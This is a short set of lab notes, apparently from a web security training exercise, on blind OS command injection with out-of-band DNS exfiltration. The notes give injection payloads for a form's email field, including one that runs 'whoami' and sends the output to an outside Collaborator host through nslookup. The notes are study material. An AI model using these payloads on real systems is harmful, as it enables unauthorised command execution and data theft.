@@ -1,0 +1,18 @@
+Blind OS command injection with out-of-band data exfiltration
+Goal: Exploit blind OS command injection to execute whoami command
+and exfiltrate output via DNS query to Burp Collaborator
+
+1)
+-Click Submit Feedback
+-Fill out form, Click Submit Feedback
+-Send Post to repeater
+-Open collaborator and copy to clipboard
+
+2)
+-Repeater email field, & nslookup 3gkea86ozmztudmw6dzfb08ytpzgn7bw.oastify.com #
+-url encode
+-Send
+
+3)
+-Repeater email field, & nslookup `whoami`.3gkea86ozmztudmw6dzfb08ytpzgn7bw.oastify.com #
+->peter-9Gt2Yk
